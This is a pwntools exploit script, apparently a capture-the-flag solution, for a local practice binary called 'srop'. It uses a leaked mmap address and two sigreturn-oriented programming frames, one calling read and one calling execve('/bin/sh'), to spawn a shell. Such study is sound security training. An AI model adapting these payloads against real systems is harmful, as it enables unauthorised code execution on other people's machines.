#!/usr/bin/env python3
from pwn import *


c = process('./srop')
elf = ELF('./srop')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(c, 'init-gef')

#context.log_level = 'debug'

"""
my_restore_rt: 0x401176
new_mmap: 0x7fb5f370c010
"""

my_restore_rt = 0x4011be
syscall_ret = 0x4011c7
print(
"""
b *0x4011be
b *0x4011c7
""")

# 取得 leak 出的 mmap 的位置
# drop first line
c.recvuntil('\n')
new_mmap = c.recvuntil('\n')[:-1].decode().strip().split(' ')[-1]
new_mmap = int(new_mmap, 16)
print(hex(my_restore_rt), hex(new_mmap), hex(syscall_ret))

mmap1 = new_mmap + 0x2000
mmap2 = mmap1 + 0x2000

stack = mmap2
bin_sh = stack + 0x300

"""
1. read "/bin/sh" to mmap1
"""

# 第一個 SROP 嘗試去讀入資料到 heap 中
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack
sigframe.rdx = 0x1000
sigframe.rip = syscall_ret
sigframe.rsp = stack

payload = b'a' * 0x20 + b'rbpprbpp' + p64(my_restore_rt) + bytes(sigframe)
c.send(payload)

# 第二個 SROP 嘗試去執行 execve
execve_sigframe = SigreturnFrame()
execve_sigframe.rax = constants.SYS_execve
execve_sigframe.rdi = bin_sh
execve_sigframe.rsi = 0
execve_sigframe.rdx = 0
execve_sigframe.rsp = stack
execve_sigframe.rip = syscall_ret

payload = flat({0x0: p64(my_restore_rt), 0x8: bytes(execve_sigframe), 0x300: '/bin/sh\0'})
c.sendafter('done', payload)

c.interactive()

